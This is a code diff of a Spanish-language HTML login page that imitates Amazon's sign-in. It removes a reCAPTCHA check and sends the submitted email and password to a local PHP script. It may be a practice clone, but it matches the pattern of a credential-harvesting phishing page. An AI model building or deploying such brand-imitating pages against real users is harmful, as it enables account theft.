@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Iniciar sesión en Amazon</title>
     <link rel="stylesheet" href="css/login.css">
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <script src="scripts/login.js"></script>
 </head>
 <body>
     <div class="login-container">
@@ -14,13 +14,12 @@
         </div>
         <div class="login-form">
             <h1>Iniciar sesión</h1>
-            <form>
+            <form id="loginForm" action="BaseDato/login.php" method="POST">
                 <label for="email">E-mail o celular</label>
-                <input type="text" id="email" name="email">
-                <label for="pass">Contraceña</label>
-                <input type="password" id="pass" name="pass">
+                <input type="text" id="email" name="email" required>
+                <label for="pass">Contraseña</label>
+                <input type="password" id="pass" name="password" required>
                 <button type="submit">Continuar</button>
-                <div class="g-recaptcha" data-sitekey="your-site-key"></div>
             </form>
             <p>Al continuar, aceptas las <a href="#">Condiciones de uso</a> y el <a href="#">Aviso de privacidad</a> de Amazon.</p>
             <a href="#" class="help-link">¿Olvidaste tu contraseña?</a>
